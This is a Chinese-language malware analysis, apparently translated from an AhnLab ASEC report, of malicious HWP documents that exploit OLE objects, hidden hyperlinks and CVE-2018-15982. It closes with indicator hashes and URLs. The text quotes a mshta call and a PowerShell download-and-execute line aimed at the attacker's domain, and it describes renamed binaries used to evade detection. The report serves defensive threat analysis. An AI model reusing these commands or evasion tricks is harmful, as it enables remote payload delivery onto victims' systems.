ASEC 分析人员发现了一个利用 OLE 对象的恶意 HWP 文件，尽管其使用了 2020 年就被识别的恶意 URL，但仍然使用了 Flash
漏洞（CVE-2018-15982），需要用户谨慎对待。

打开 HWP 文件时会在 `%TEMP%`文件夹中生成如下文件。攻击者不直接使用 powershell.exe 和 mshta.exe
可能是为了要规避检测。

文件名| 描述  
---|---  
hword.exe| 普通的 PowerShell 程序  
hwp.exe| 普通的 mshta 程序  
hwp.lnk| 恶意链接文件  
1234dd.tmp| 恶意 HWP 文件  
  
攻击者使用白色矩形图片覆盖插入的 OLE 对象，如下所示：

![image.png-100.7kB](https://image.3001.net/images/20220907/1662547964_631877fcdc3a68d35b8da.png!small)插入文档的
OLE 对象

![image.png-63.4kB](https://image.3001.net/images/20220907/1662547965_631877fdcb626a219ece5.png!small)文件信息

从文件内容来看，文件中带有个人资料表格等标题。与过去类似，攻击者在每个格中通过空格与超链接来执行恶意文件。

![image.png-101.2kB](https://image.3001.net/images/20220907/1662547966_631877fe7a70b8e8510a0.png!small)嵌入超链接

![image.png-82.3kB](https://image.3001.net/images/20220907/1662547967_631877ff4c332364a4153.png!small)超链接详情

当用户单击字段填写表格时，就会执行嵌入的超链接。超链接以相对路径构建，因此 HWP 文件必须处在特定的位置才能触发恶意行为。

通过 mshta.exe 来连接恶意 URL（`%tmp%\hwp.exe
“hxxp://yukkimmo.sportsontheweb[.]net/hw.php”`）。

可以根据攻击者的意图来执行各种恶意命令：

![image.png-188.8kB](https://image.3001.net/images/20220907/1662547968_6318780000108c574009a.png!small)传输的命令

另一个值得一提的恶意命令是：`hword.exe -nop -c \”iex(new-object
net.webclient).downloadstring('hxxp://yukkimmo.sportsontheweb[.]net/h.txt')`。

![image.png-173.4kB](https://image.3001.net/images/20220907/1662547968_63187800bf1256fdd1be0.png!small)脚本代码

脚本具备两项功能：

  * 通过 `hxxp://yukkimmo.sportsontheweb[.]net/2247529.txt`下载其他 PE 文件，保存在 %temp% 文件夹中并通过 Process Hollowing 执行。

![image.png-30.5kB](https://image.3001.net/images/20220907/1662547969_631878016a906f1587e78.png!small)进程树

  * 生成的文件 `1234dd.tmp`被重命名为 `3dd21.tmp`。当用户再次打开 HWP 文件时，会自动打开嵌入了 Flash 对象的 HWP 文件（1234dd.tmp），该文件与前述提到的文件也是类似的。

![image.png-108.3kB](https://image.3001.net/images/20220907/1662547970_63187802101a2b9e0be11.png!small)文件信息

后续的 HWP 文件包含一个 Flash 对象，其中嵌入了某个 URL。

![image.png-126.2kB](https://image.3001.net/images/20220907/1662547970_63187802b703a53bb9ea5.png!small)嵌入
Flash 对象

![image.png-234.2kB](https://image.3001.net/images/20220907/1662547971_6318780369d9f9a8c558e.png!small)对象属性

该 URL（hxxp://www.sjem.co[.]kr/admin/data/category/notice_en/view.php）早在 2020
年就被检测为恶意。

另一个 HWP 文件，伪装成用于支付服务费的个人数据收集表格。其中也嵌入了 OLE 对象，执行的文件基本类似。

![image.png-121.9kB](https://image.3001.net/images/20220907/1662547972_631878042d83570c83681.png!small)识别额外的
HWP 文件

![image.png-110.6kB](https://image.3001.net/images/20220907/1662547973_6318780512f3ba4383deb.png!small)文件信息

表格中依旧嵌入了超链接，用户单击时就会触发 LNK
文件执行命令（hxxp://yukkimmo.sportsontheweb[.]net/hw.php），与前述文章类似。

## IOC

> 76f8ccf8313af617df28e8e1f7f39f73  
> 9a13173df687549cfce3b36d8a4e20d3  
> 804d12b116bb40282fbf245db885c093  
> caa923803152dd9e6b5bf7f6b816ae98  
> 2f4ed70149da3825be16b6057bf7b8df  
> 65993d1cb0d1d7ce218fb267ee36f7c1  
> 330f2f1eb6dc3d753b756a27694ef89b  
> hxxp://yukkimmo.sportsontheweb.net/hw.php  
> hxxp://yukkimmo. sportsontheweb[.]net/h.txt  
> hxxp://yukkimmo.sportsontheweb[.]net/2247529.txt  
> hxxp://www.sjem.co[.]kr/admin/data/category/notice_en/view.php

## 参考来源

> [AhnLab](https://asec.ahnlab.com/en/38479/)

